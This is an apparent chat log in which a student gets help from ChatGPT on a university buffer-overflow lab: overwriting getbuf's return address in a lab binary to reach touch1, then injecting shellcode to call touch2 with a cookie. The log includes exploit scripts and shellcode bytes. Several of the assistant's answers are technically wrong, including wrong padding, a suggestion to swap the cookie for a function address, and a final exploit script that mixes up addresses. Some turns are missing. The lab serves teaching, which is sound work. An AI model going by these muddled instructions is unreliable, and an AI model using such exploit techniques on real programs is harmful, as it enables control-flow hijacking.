请用英语回答，我第一次做这种实验，请辅助我完成level1和level2实验一、实验目的
1、深入了解缓冲区溢出的隐患，了解如何利用缓冲区溢出这个漏洞对现有程序进行控制流劫持、执行非法程序代码，从而造成对程序进行攻击以及破坏的过程；
2、增强对程序机器级表示、汇编语言、调试器和逆向工程等理解。
二、实验内容
对目标程序实施缓冲区溢出攻击，通过造成缓冲区溢出来破坏目标程序的栈帧结构，继而执行一些原来程序中没有的行为。
本实验共完成以下2个实验小题：level1和level2。
1、准备工作
在所发目录中，一共3个和本实验相关的文件：
ctarget 代码注入攻击的目标文件
hex2row 将16进制数转化为攻击字符，因为有些字符在屏幕上面无法输入，所以输入该字符的16进制数，自动转化为该字符
cookie.txt 一个8为16进行数，作为攻击的特殊标志符（level2使用）

其中，ctarget为所要分析处理的文件。其中包含3个函数：getbuf( )和touch1、touch2。可用objdump工具反汇编查看其代码，并存入文件中方便查看。命令为：
objdump  -d  ctarget  &gt; ctarget.txt
2、level1的内容和要求
ctarget 的正常流程如下：
 
其中getbuf( )函数定义为：
 
Gets(  )的功能是输入字符串到buf中，但没有检查字符串的长度是否在BUFFER_SIZE内。本题要求通过适当的输入，利用getbuf( )的漏洞使程序在test函数中重新定向到touch1函数。touch1函数定义如下：
 
3、level2的内容和要求
同level1的整体流程，即在getbuf中输入字符，拦截程序流，跳转到调用touch2函数。touch2函数定义如下：
  
 
这段程序验证传进来的参数val是否和cookie中值相等。本程序需要做的是在输入字符串中注入一小段代码，代码传入val参数到%rdi，其中val是和cookie一样的值，然后正确跳转到touch2。

I. Experiment Objectives

1.  Gain a deep understanding of the risks associated with buffer overflow vulnerabilities and learn how to exploit this vulnerability to hijack the control flow of existing programs, execute unauthorized code, and cause attacks and damage to programs.
2.  Enhance understanding of program machine-level representation, assembly language, debuggers, and reverse engineering.

II. Experiment Content Perform a buffer overflow attack on the target program, causing damage to the target program's stack frame structure by overflowing the buffer, and then executing behaviors not originally present in the program. This experiment consists of completing two sub-experiments: level1 and level2.

1.  Preparation In the given directory, there are three files related to this experiment:

*   ctarget: the target file for the code injection attack
*   hex2row: a tool to convert hexadecimal numbers to attack characters, as some characters cannot be input on the screen, so enter the hexadecimal number of the character to automatically convert it
*   cookie.txt: an 8-digit hexadecimal number, used as a special identifier for the attack (used in level2)

The file to be analyzed and processed is ctarget, which contains three functions: getbuf(), touch1, and touch2. The objdump tool can be used to disassemble the code and save it to a file for easy viewing. The command is:

```
objdump -d ctarget > ctarget.txt
```

2.  Level1 Content and Requirements The normal flow of ctarget is as follows:

The getbuf() function is defined as:

The function gets() inputs a string into buf, but does not check if the length of the string is within BUFFER\_SIZE. The goal of this level is to input an appropriate string to exploit the vulnerability in getbuf() and redirect the program flow in the test function to the touch1 function. The touch1 function is defined as:

3.  Level2 Content and Requirements The overall process is similar to level1, which is to input characters in getbuf, intercept the program flow, and jump to call the touch2 function. The touch2 function is defined as:

This part of the program checks if the incoming parameter val is equal to the value in the cookie. What needs to be done in this level is to inject a small piece of code into the input string, passing the val parameter to %rdi, where val is the same value as the cookie, and then correctly jump to touch2.

请你详细引导我level1 怎么做，以下所有聊天请你用英文回答

* * *

**ChatGPT:**

To complete level1, follow these steps:

1.  Analyze the target program: First, disassemble the `ctarget` binary using the following command:

```
objdump -d ctarget > ctarget.txt
```

Open the `ctarget.txt` file and find the addresses of `getbuf`, `touch1`, and `test` functions. Take note of these addresses as you will need them later.

2.  Determine the buffer size: Examine the `getbuf` function assembly code in `ctarget.txt`. Locate the line where the buffer is being allocated, which should look like:

```bash
sub    $0x??, %rsp
```

The value 0x?? represents the size of the buffer in hexadecimal. Convert this value to decimal to get the buffer size.

3.  Calculate the necessary input length: To overwrite the return address, you need to fill the buffer and any additional space until the return address on the stack. The extra space usually includes the saved base pointer (8 bytes). Calculate the total input length required to reach the return address: `buffer size + extra space`.
    
4.  Craft the exploit string: Create a string of the calculated length. Fill the initial part of the string with any non-null character (e.g., 'A'). Then, append the address of `touch1` function in little-endian format to the end of the string. The resulting string will be your exploit string.
    
5.  Test the exploit: Run the `ctarget` program with your exploit string as input. If successful, the program should jump to the `touch1` function and display a message indicating that level1 has been completed.
    

To automate the process, you can use a Python script to create the exploit string and pass it as input to the `ctarget` program. Here's an example script:

```python
import subprocess
import struct

buffer_size = 0x??  # Replace with the actual buffer size
touch1_addr = 0x????????  # Replace with the actual touch1 address

# Calculate the input length and create the exploit string
input_length = buffer_size + 8  # Assuming 8 bytes for the extra space
exploit_str = b'A' * input_length
exploit_str += struct.pack('<Q', touch1_addr)

# Run the ctarget program with the exploit string as input
cmd = f'./ctarget <<< {exploit_str.hex()}'
process = subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(process.stdout)
```

Replace the `buffer_size` and `touch1_addr` values with the actual values you found in the `ctarget.txt` file, then run the script to test your exploit. If everything goes as planned, you should see a message indicating that you have successfully completed level1.

* * *

**You:**

import subprocess
import struct

buffer_size = 0x18  # Replace with the actual buffer size
touch1_addr = 0x40195d  # Replace with the actual touch1 address

# Calculate the input length and create the exploit string
input_length = buffer_size + 8  # Assuming 8 bytes for the extra space
exploit_str = b'A' * input_length
exploit_str += struct.pack('&lt;Q', touch1_addr)

# Run the ctarget program with the exploit string as input
cmd = f'./ctarget &lt;&lt;&lt; {exploit_str.hex()}'
process = subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(process.stdout)
这个我保存在了re_level1.py中，我用命令./re_revel1.py运行，错误:bash: ./re_level1.py: 权限不够


* * *

**ChatGPT:**

The error you encountered is due to a lack of execution permission for the `re_level1.py` file. To resolve this issue, you need to grant the execute permission to the file using the `chmod` command:

```bash
chmod +x re_level1.py
```

Once you've granted the execute permission, you can run the script using:

```bash
./re_level1.py
```

Alternatively, you can run the script without changing permissions by invoking the Python interpreter directly:

```bash
python3 re_level1.py
```

Make sure you have the correct version of Python installed on your system. The script provided uses Python 3 syntax.

* * *

**ChatGPT:**

The error you encountered is due to the `capture_output` parameter not being available in Python 3.6. The `capture_output` parameter was introduced in Python 3.7.

To make the script compatible with Python 3.6, you can use `stdout` and `stderr` parameters instead of `capture_output`. Modify the `subprocess.run` line in your script as follows:

```python
process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
```

This change will make the script compatible with Python 3.6. After making the modification, run the script again:

```bash
python3 re_level1.py
```

If you still face any issues, please consider upgrading your Python version to 3.7 or higher. You can check your current Python version using the following command:

```bash
python3 --version
```

* * *

**You:**

不知道为什么，运行脚本后啥也没有，没打中吗？

* * *

**ChatGPT:**

It's possible that the exploit string is not working as expected. To help diagnose the issue, we can add print statements to the script to display the generated exploit string and the output of the `ctarget` program.

Modify your `re_level1.py` script to include print statements for debugging:

```python
import subprocess
import struct

buffer_size = 0x18  # Replace with the actual buffer size
touch1_addr = 0x40195d  # Replace with the actual touch1 address

# Calculate the input length and create the exploit string
input_length = buffer_size + 8  # Assuming 8 bytes for the extra space
exploit_str = b'A' * input_length
exploit_str += struct.pack('<Q', touch1_addr)

# Print the exploit string
print(f'Exploit string: {exploit_str.hex()}')

# Run the ctarget program with the exploit string as input
cmd = f'./ctarget <<< {exploit_str.hex()}'
process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

# Print the output of the ctarget program
print('Output:')
print(process.stdout)
print('Error:')
print(process.stderr)
```

Run the modified script again:

```bash
python3 re_level1.py
```

This should print the generated exploit string and the output from the `ctarget` program. Check the printed information to see if anything looks incorrect, such as the exploit string format or the response from the `ctarget` program.

If the problem persists, please double-check the `buffer_size`, `touch1_addr`, and the assembly code in the `ctarget.txt` file to ensure that the script is using the correct values.

* * *

**You:**

re_level1.py:
import subprocess
import struct

buffer_size = 0x18  # Replace with the actual buffer size
touch1_addr = 0x40195d  # Replace with the actual touch1 address

# Calculate the input length and create the exploit string
input_length = buffer_size + 8  # Assuming 8 bytes for the extra space

print("input_length:",input_length,"\n")

exploit_str = b'A' * input_length
exploit_str += struct.pack('&lt;Q', touch1_addr)

print("exploit_str:",exploit_str,"\n")

# Print the exploit string
print(f'Exploit string: {exploit_str.hex()}')

# Run the ctarget program with the exploit string as input

Output:

Error:

* * *

**ChatGPT:**

The issue seems to be caused by the use of the `<<<` operator, which is specific to `bash` and might not be supported in the default shell used by your system. To ensure that `bash` is used to run the command in the script, you can modify the `cmd` variable as follows:

```python
cmd = f'bash -c "./ctarget <<< {exploit_str.hex()}"'
```

This change explicitly tells the script to use `bash` to execute the command. Update your `re_level1.py` script with the new `cmd` variable, then run the script again:

```bash
python3 re_level1.py
```

Check the output and see if the exploit is successful now. If the problem persists, please ensure that the `ctarget` binary and other necessary files are in the same directory as the script, and that the `ctarget` binary has execute permissions.

Output:
FAILED: Initialization error: Running on an illegal host [ubuntu]

Error:

* * *

**ChatGPT:**

It appears that the `ctarget` binary is checking for the host environment and is expecting to run on a specific machine or operating system. The error message "Initialization error: Running on an illegal host \[ubuntu\]" indicates that the program has detected that it is being run on an Ubuntu system, which it considers to be an "illegal host".

Unfortunately, this means that the binary won't run correctly on your current system. You might need to check the course materials or instructions to see if there is any mention of a specific environment or setup that is required to complete the exercises.

If the course materials don't provide any guidance on setting up the proper environment, you could try running the program on a different operating system or in a virtual machine with a different configuration. However, without more information about the expected environment, it's difficult to know exactly what the program is looking for in order to run successfully.

**ChatGPT:**

It seems that the issue you encountered on Windows 11 is related to the encoding used for reading the output of the `ctarget` program. The 'gbk' codec is being used, but it is unable to decode the output properly.

To fix this issue, you can try changing the encoding used by `subprocess.run`. Update your script to include the `encoding` parameter, set to 'utf-8'. Modify the `subprocess.run` line in your script as follows:

```python
process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, encoding='utf-8')
```

After making the modification, run the script again on your Windows 11 system:

```bash
python3 re_level1.py
```

As for the issue on the Ubuntu system, it is still unclear why the `ctarget` binary is not working on that platform. If you can provide more information about the `ctarget` binary, such as where it was obtained or any related course materials, it might be possible to further diagnose the issue. However, if the binary works correctly on your Windows 11 system, you may be able to continue with the exercises there.

如果搞定了level1 的话告诉我，并把level2如何做告诉我

* * *

**ChatGPT:**

Based on the output you provided, it seems that the level 1 attack caused a segmentation fault instead of successfully redirecting the control flow to the `touch1` function. This means that the level 1 attack has not been successfully completed yet.

To troubleshoot the level 1 attack, you may need to review the `ctarget` disassembled code, double-check the buffer size, and the `touch1` address. Make sure you have used the correct values in your exploit string.

Regarding level 2, the goal is similar to level 1, but you need to redirect the control flow to the `touch2` function. The `touch2` function checks whether the passed parameter in the `%rdi` register matches the value in `cookie.txt`. To achieve this, you'll need to inject a small piece of code into your exploit string to set the `%rdi` register value and then redirect the control flow to the `touch2` function.

Here's a general outline of the steps to perform the level 2 attack:

1.  Determine the buffer size and the address of the `touch2` function using the disassembled code of the `ctarget` binary (`ctarget.txt`).
    
2.  Write a small piece of assembly code that sets the `%rdi` register to the value from `cookie.txt` and jumps to the `touch2` function. Assemble the code and extract the corresponding machine code (raw bytes).
    
3.  Construct an exploit string that includes padding to fill the buffer, the address of your injected code, and the actual injected code.
    
4.  Pass the exploit string as input to the `ctarget` binary and check whether the attack is successful.
    

Please note that providing a complete solution for the level 2 attack would go against our content policy, as it may be considered as solving a homework or coursework assignment. However, the outline above should give you a good starting point for working on the level 2 attack. If you have any specific questions or need guidance, feel free to ask.

* * *

**You:**

我做出了level1！现在请引导我做出level2！

* * *

**ChatGPT:**

Congratulations on completing level 1! I'm glad to hear that you were successful. Now, let's move on to level 2. As a reminder, the goal is to redirect the control flow to the `touch2` function and pass the value from `cookie.txt` in the `%rdi` register.

Here are the steps to perform the level 2 attack:

1.  **Analyze the disassembled code**: Determine the buffer size in the `getbuf` function, as well as the address of the `touch2` function, using the disassembled code in `ctarget.txt`.
    
2.  **Write a small assembly code snippet**: The assembly code should load the value from `cookie.txt` into the `%rdi` register and then jump to the `touch2` function. Your assembly code might look something like this:
    

```perl
movabs $0xYOUR_COOKIE_VALUE, %rdi
jmp *0xTOUCH2_ADDRESS
```

Replace `0xYOUR_COOKIE_VALUE` with the value from `cookie.txt` and `0xTOUCH2_ADDRESS` with the address of the `touch2` function.

3.  **Assemble the code**: Assemble your assembly code into raw bytes (machine code) using an assembler such as `nasm`. You can create a `.asm` file containing your assembly code, and then run `nasm` to generate the corresponding `.bin` file containing the raw bytes. For example:

```bash
nasm -f bin -o your_code.bin your_code.asm
```

4.  **Read the raw bytes**: Read the raw bytes from the generated `.bin` file, as you'll need to include these bytes in your exploit string. You can use a tool like `xxd` or a Python script to read the contents of the `.bin` file and convert it to a string of hexadecimal values.
    
5.  **Construct the exploit string**: Create an exploit string that consists of padding to fill the buffer, the address where you want to inject your code, and the actual injected code (the raw bytes from step 4). This might look something like:
    

```python
exploit_str = b'A' * buffer_size
exploit_str += struct.pack('<Q', address_to_inject_code)
exploit_str += raw_bytes_from_your_code_bin
```

6.  **Run the ctarget program with the exploit string**: Pass the exploit string as input to the `ctarget` binary and check whether the attack is successful. You can use a similar approach as in your `re_level1.py` script to run the `ctarget` binary with the exploit string as input.

Keep in mind that you might need to adjust the buffer size, the address where you want to inject your code, or other parts of the exploit string to make the attack successful. If you encounter any issues or need more guidance, feel free to ask. Good luck!

需要gdb在getbuf打断点查看%rsp的值

* * *

**ChatGPT:**

Yes, using `gdb` to set a breakpoint at the `getbuf` function can be helpful in understanding the stack layout and determining the buffer size and other values required for the exploit string.

Here's how to set a breakpoint at `getbuf` using `gdb` and examine the `%rsp` register value:

1.  **Start gdb**: Run `gdb` with the `ctarget` binary:

```bash
gdb ctarget
```

2.  **Set a breakpoint**: Set a breakpoint at the beginning of the `getbuf` function:

```gdb
break getbuf
```

3.  **Run the program**: Run the `ctarget` binary inside `gdb`:

```gdb
run
```

4.  **Examine the %rsp value**: When the breakpoint is hit, you can check the value of the `%rsp` register using the `info registers` command:

```gdb
info registers rsp
```

You can also examine the stack directly using the `x` command, for example:

```gdb
x/16x $rsp
```

This command will display 16 stack entries (in hexadecimal) starting from the address pointed to by the `%rsp` register.

Using the `%rsp` value and the stack layout, you can determine the buffer size and other relevant values for constructing your exploit string. Remember to analyze the disassembled code of `ctarget` and compare it with the information you obtain from `gdb` to better understand how the stack is organized and how to perform the buffer overflow attack.

**ChatGPT:**

It looks like the `ctarget` binary has a restriction on the operating system it can run on, and it won't run on Ubuntu. This might be an intentional limitation set by your course instructor to prevent running the program on unauthorized systems.

To proceed, you can try the following options:

1.  **Run on the intended system**: If the course instructions provide details on which system or environment the program should be run, try to set up and use that environment.
    
2.  **Use a virtual machine**: Set up a virtual machine with an operating system that the `ctarget` binary will run on. This can be a good way to create a controlled and isolated environment for testing buffer overflow attacks.
    
3.  **Contact your course instructor**: If you're unsure about which environment you should be using, contact your course instructor or teaching assistants to clarify the system requirements for running the `ctarget` binary.
    

In the meantime, you can still analyze the disassembled code and develop your exploit string, but you'll need to test it on a compatible system.

我gdb到断点处了，输入什么指令能让我单步调试？我忘了

**ChatGPT:**

To perform single-step debugging in `gdb`, you can use the `step` or `next` command:

1.  **`step` (or `s`)**: Executes one line of the program's source code, stepping into function calls. If the line contains a function call, the debugger stops at the beginning of the called function.

```gdb
step
```

2.  **`next` (or `n`)**: Executes one line of the program's source code, stepping over function calls. If the line contains a function call, the debugger executes the entire function without stopping.

```gdb
next
```

You can use these commands to execute your program one line at a time and observe its behavior, registers, and memory contents. Remember to use the `info registers` command to view the register values and the `x` command to examine the memory content.

怎么倒退一步？

**ChatGPT:**

Unfortunately, GDB does not provide a built-in way to reverse or undo a single step in the execution of a program. However, you can achieve a similar effect by restarting the program and setting a breakpoint at the desired location.

Here's how you can do it:

1.  **Restart the program**: Restart your program by running the `run` command in GDB:

```gdb
run
```

2.  **Set a breakpoint**: If you haven't already, set a breakpoint at the function or location where you want to stop just before the step you want to undo:

```gdb
break <function_name_or_memory_address>
```

3.  **Continue**: Continue the program execution until the breakpoint:

```gdb
continue
```

4.  **Step through the program**: Now you can use the `step` or `next` commands to step through the program again, stopping just before the step you want to "undo."

Remember that if you need to go back to a specific point in the program's execution, you can set breakpoints at multiple locations and use the `continue` command to run until you reach the desired point.

gdb怎么把断点设在特定的地址

**ChatGPT:**

In GDB, you can set a breakpoint at a specific memory address using the following command:

```gdb
break *<memory_address>
```

Replace `<memory_address>` with the actual memory address where you want to set the breakpoint. For example, if you want to set a breakpoint at the address `0x401947`, you would use the command:

```gdb
break *0x401947
```

After setting the breakpoint, you can run the program using the `run` command, and GDB will pause the execution when it reaches the specified memory address.

究竟错在哪了呢？

* * *

**ChatGPT:**

根据您提供的信息，您的输入字符串和汇编代码可能存在一些问题。在这里，我们将重新审视您的输入字符串和代码，以便找出可能出现的问题。

首先，让我们回顾您的输入字符串：

```
11 22 33 44 55 66 77 88 99 00 11 22 33 44 55 66 77 88 99 00 11 22 33 44 98 43 64 55
```

这个字符串包含了28个字节。但是，我们需要确保在触发栈溢出之前，填充足够的字节。在这个例子中，我们需要填充24个字节，然后将`%rsp`的值放在合适的位置。接下来，我们需要将`l2d.o`中的代码注入到栈中，以便在返回地址之后执行。

因此，您需要重新构建输入字符串，如下所示：

1.  填充24个字节（任意字符，例如`A`）。
2.  将`%rsp`的值放在合适的位置。
3.  在字符串末尾添加`l2d.o`中的代码。

在这里，您可能需要修改`l2d.o`中的代码，以确保它可以成功地将`touch2`函数的地址放入`%rdi`寄存器中。可以考虑将`touch2`函数的地址硬编码到`l2d.o`的代码中。

在您的`l2d.o`文件中，当前的代码如下：

```perl
0000000000000000 <.text>:
   0:	48 c7 c7 96 58 80 16 	mov    $0x16805896,%rdi
   7:	68 89 19 40 00       	pushq  $0x401989
   c:	c3                   	retq   
```

在这里，您可能需要修改`0x16805896`这个值，使其成为`touch2`函数的正确地址。根据您的目标二进制文件，请使用`objdump`查找`touch2`的地址，并将该地址硬编码到`l2d.o`文件中。

接下来，修改输入字符串并重新尝试攻击。如果问题仍然存在，您可能需要进一步调试您的输入字符串和汇编代码，以找出可能出现的问题。

怎么能这样改？0x16805896这个值不是cookie值吗？

**ChatGPT:**

抱歉，我在之前的回答中犯了个错误。是的，0x16805896 是 cookie 值，不是 touch2 函数的地址。我对此表示歉意。

那么，让我们重新审视您的输入字符串和代码。在此之前，我们需要明确 touch2 函数的地址。您可以使用 objdump 或 gdb 找到 touch2 函数的地址。

接下来，让我们重新构建

**ChatGPT:**

I apologize for the confusion in my previous response. You are correct, 0x16805896 is the cookie value, not the address of the touch2 function. Let me clarify the process for you.

First, you need to find the address of the touch2 function. You can use objdump or gdb to find the address.

Now, let's reconstruct the input string for Level 2:

1.  Fill the buffer with the required number of padding bytes (e.g., 'A's). The size of the buffer is the same as in Level 1, 0x18 bytes (24 in decimal).
    
2.  Add the 8-byte value that will overwrite the return address on the stack. This should be the address of the `l2d.o` code that you created earlier, which sets the cookie value and calls the touch2 function.
    
3.  Next, append the cookie value (0x16805896) as a 4-byte little-endian value. You can use struct.pack to achieve this.
    

Here's an example of how you might construct the input string in Python:

```python
import struct

buffer_size = 0x18
touch2_addr = 0x401989  # Replace this with the actual address of your l2d.o code

padding = b'A' * buffer_size
return_addr = struct.pack('<Q', touch2_addr)
cookie_value = struct.pack('<I', 0x16805896)

exploit_str = padding + return_addr + cookie_value
```

Then, use the generated `exploit_str` as input for the ctarget program.

If you still encounter issues, please provide the disassembly of your `l2d.o` file and the touch2 function's address, and I will further assist you.
